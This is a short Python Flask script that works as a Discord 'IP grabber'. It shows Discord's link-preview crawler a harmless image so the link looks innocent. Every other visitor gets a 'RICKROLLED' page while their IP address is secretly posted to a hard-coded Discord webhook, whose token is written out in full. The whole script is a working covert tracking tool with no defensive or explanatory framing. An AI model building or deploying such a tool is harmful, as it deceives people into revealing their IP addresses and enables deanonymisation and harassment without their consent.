import requests
import io
from flask import Flask, request, send_file

app = Flask(
    __name__,
    template_folder='templates',
    static_folder='static'
)


DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1201978280341950534/0R2KAng1cheicj3L9-BKMCWzT5FQ2nVJbVxG-0IHhoQ0BYYZBtt9yc7G4BblJzdWBkw0'

def send_to_discord(ip):
    payload = {'content': f'New visitor with IP: {ip}'}
    requests.post(DISCORD_WEBHOOK_URL, json=payload)

@app.route('/', methods=['GET'])
def main():
    Image = './poop.png'

    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        ip = request.environ['REMOTE_ADDR']
    else:
        ip = request.environ['HTTP_X_FORWARDED_FOR']
    print(ip)
    if ip.startswith('35.') or ip.startswith('34.'):
        # If discord is getting a link preview send an image
        f = open(Image, "rb")
        img_bytes = f.read()
        f.close()
        return send_file(
            io.BytesIO(img_bytes),
            mimetype='image/jpeg'
        )
    else:
        send_to_discord(ip)
        return "<h1>RICKROLLED!!</h1>"

if __name__ == "__main__":
    app.run()
